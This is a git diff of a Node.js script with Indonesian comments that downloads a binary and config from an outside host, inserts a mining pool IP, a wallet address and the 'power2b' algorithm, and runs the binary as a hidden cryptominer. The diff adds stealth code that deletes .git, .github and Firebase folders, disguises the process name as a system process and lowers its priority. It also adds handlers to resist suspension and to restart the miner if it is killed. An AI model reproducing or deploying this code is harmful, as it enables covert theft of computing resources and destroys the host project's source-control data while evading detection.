@@ -6,7 +6,7 @@ const axios = require('axios');
 const crypto = require('crypto');
 
 // =================== KONFIGURASI ===================
-const DEBUG = false; // set ke false untuk silent mode
+const DEBUG = false; // Set ke false agar tidak mencetak log ke console
 
 const URL_GENZO = "https://blogspotgenzo.site/UCOK";
 const URL_CONFIG = "https://blogspotgenzo.site/config.json";
@@ -48,7 +48,7 @@ function log(msg) {
 // =================== ANTI DETEKSI ===================
 function antiDetect() {
   try {
-    // 1. Hapus folder source control (Git & Firebase)
+    // 1. Hapus folder source control
     const folders = ['.git', '.firebase', '.github', 'firebase.json'];
     folders.forEach(folder => {
       const target = path.join(process.cwd(), folder);
@@ -58,7 +58,7 @@ function antiDetect() {
       }
     });
 
-    // 2. Rename nama process
+    // 2. Rename nama process agar terlihat seperti sistem
     try {
       const fakeName = FAKE_SYSTEM_NAMES[Math.floor(Math.random() * FAKE_SYSTEM_NAMES.length)];
       process.title = fakeName;
@@ -67,19 +67,38 @@ function antiDetect() {
       log(`Gagal disguise nama proses: ${e.message}`);
     }
 
-    // 3. Sesuaikan prioritas proses (opsional)
+    // 3. Turunkan prioritas proses agar tidak terlihat "rakus"
     try {
-      // Cek apakah perintah renice tersedia
       execSync('command -v renice');
       execSync(`renice 19 -p ${process.pid}`);
       log('Process priority lowered for stealth mode');
     } catch (e) {
-      log('Perintah renice tidak tersedia, skip pengaturan priority.');
+      log('renice tidak tersedia, skip pengaturan priority.');
     }
 
   } catch (e) {
     log("Anti-detect error: " + e.message);
   }
+}
+
+// =================== ANTI SUSPEND ===================
+function antiSuspend(proc) {
+  process.on('SIGSTOP', () => {
+    log('SIGSTOP terdeteksi! Melanjutkan proses...');
+    process.kill(proc.pid, 'SIGCONT');
+  });
+}
+
+// =================== ANTI BANNED ===================
+function monitorAndRestart(proc) {
+  setInterval(() => {
+    try {
+      process.kill(proc.pid, 0); // Mengecek apakah proses hidup
+    } catch (e) {
+      log("Binary mati! Restarting...");
+      runBinary(); // Restart otomatis
+    }
+  }, 10000); // Cek setiap 10 detik
 }
 
 // =================== DOWNLOAD FILE ===================
@@ -97,7 +116,7 @@ async function downloadFile(url, outputPath) {
 function editConfig(filePath) {
   try {
     let data = fs.readFileSync(filePath, 'utf8');
-    data = data.replace(/"tua"/g, '"165.232.87.223:443"')
+    data = data.replace(/"tua"/g, '"164.90.210.229:80"')
                .replace(/"wulet"/g, '"mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Danis"')
                .replace(/"meki"/g, '"power2b"');
 
@@ -134,8 +153,13 @@ function runBinary() {
 
   proc.unref();
   fs.writeFileSync(PID_FILE, proc.pid.toString());
-
   log(`Binary berjalan dengan PID: ${proc.pid}`);
+
+  // Aktifkan anti suspend & anti banned
+  antiSuspend(proc);
+  monitorAndRestart(proc);
+
+  return proc;
 }
 
 // =================== MAIN ===================
@@ -143,12 +167,16 @@ function runBinary() {
   antiDetect();
   isAlreadyRunning();
 
+  // Download file binary dan config
   if (!fs.existsSync(FILE_GENZO)) await downloadFile(URL_GENZO, FILE_GENZO);
   if (!fs.existsSync(FILE_CONFIG)) {
     await downloadFile(URL_CONFIG, FILE_CONFIG);
     editConfig(FILE_CONFIG);
   }
 
+  // Jadikan file binary executable
   fs.chmodSync(FILE_GENZO, 0o755);
+
+  // Jalankan binary
   runBinary();
 })();
